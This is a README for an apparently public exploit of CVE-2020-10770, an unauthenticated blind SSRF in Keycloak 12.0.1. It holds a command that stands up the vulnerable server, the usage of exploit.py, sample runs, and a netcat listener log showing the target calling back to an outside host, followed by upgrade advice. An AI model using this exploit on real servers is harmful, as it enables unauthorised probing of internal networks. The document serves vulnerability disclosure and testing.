# Keycloak-12.0.1-CVE-2020-10770

> Keycloak 12.0.1 - 'request_uri ' Blind Server-Side Request Forgery (SSRF) (Unauthenticated) 

[Exploit-DB-50405](https://www.exploit-db.com/exploits/50405)

Expected outcome: Port scan of localhost or internally accessible hosts.

Intended only for educational and testing in corporate environments.

This Exploit was tested on Python 3.8.6

Vulnerable application : 

```shell
docker run -p 9990:9990 -p 8080:8080 -e KEYCLOAK_USER=admin -e KEYCLOAK_PASSWORD=admin jboss/keycloak:12.0.1
```
### Usage:

```shell
cfx:  ~/keycloak
→ python3 exploit.py -h
usage: exploit.py [-h] [-u URL]

-=[Keycloak Blind SSRF test by ColdFusionX]=-

optional arguments:
  -h, --help         show this help message and exit
  -u URL, --url URL  Keycloak Target URL (Example: http://127.0.0.1:8080)

Exploit Usage :
./exploit.py -u http://127.0.0.1:8080
[^] Input Netcat host:port -> 192.168.0.1:4444
```

### POC: 

- Scenario 1: Non Vulnerable Target

```shell
cfx:  ~/keycloak
→ python3 exploit.py -u http://localhost:8080

[+] Keycloak Bind SSRF test by ColdFusionX

[^] Input Netcat host:port -> 192.168.0.1:4444

[-] Invalid URL or Target not Vulnerable
```

- Scenario 2: Vulnerable Target

```shell
cfx:  ~/keycloak
→ python3 exploit.py -u http://localhost:8080

[+] Keycloak Bind SSRF test by ColdFusionX

[^] Input Netcat host:port -> 192.168.0.1:9994

[+] BINGO! Check Netcat listener for HTTP callback :)

```

HTTP Callback on nc listener:

```
cfx:  ~/keycloak
→ nc -lvnp 9994
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9994
Ncat: Listening on 0.0.0.0:9994
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:36866.
GET / HTTP/1.1
Host: 192.168.0.1:9994
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.5.13 (Java/11.0.9.1)
Accept-Encoding: gzip,deflate
```

### Solution

Upgrade to Keycloak 12.0.2 or later version

### Reference

- https://bugzilla.redhat.com/show_bug.cgi?id=1846270
- https://nvd.nist.gov/vuln/detail/CVE-2020-10770
